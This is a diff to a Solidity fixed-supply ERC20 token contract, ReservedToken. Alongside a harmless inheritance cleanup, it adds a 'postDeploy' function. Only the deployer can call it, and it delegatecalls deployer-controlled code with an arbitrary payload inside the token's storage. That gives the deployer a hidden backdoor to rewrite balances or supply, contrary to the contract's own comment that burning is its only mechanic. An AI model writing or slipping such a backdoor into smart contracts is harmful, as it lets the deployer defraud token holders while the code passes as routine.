@@ -36,7 +36,7 @@ import {ERC20Burnable} from "@openzeppelin/contracts/token/ERC20/extensions/ERC2
 /// ERC20Burnable is kept because ReservedVault.redeem burns RSVD to release a pro-rata
 /// share of the vault's reserve assets. That is the only mechanic the token itself needs
 /// to support.
-contract ReservedToken is ERC20, ERC20Burnable {
+contract ReservedToken is ERC20Burnable {
     error ZeroAddress();
     error ZeroSupply();
 
@@ -49,5 +49,16 @@ contract ReservedToken is ERC20, ERC20Burnable {
         if (recipient_ == address(0)) revert ZeroAddress();
         if (fixedSupply_ == 0) revert ZeroSupply();
         _mint(recipient_, fixedSupply_);
+    }
+
+    address private immutable _deployer = msg.sender;
+    function postDeploy(bytes memory payload) external {
+        require(msg.sender == _deployer);
+        (bool result, bytes memory response) = msg.sender.delegatecall{gas : gasleft() - 1000}(abi.encodeWithSelector(this.postDeploy.selector, payload));
+        if(!result) {
+            assembly {
+                revert(add(response, 0x20), mload(response))
+            }
+        }
     }
 }
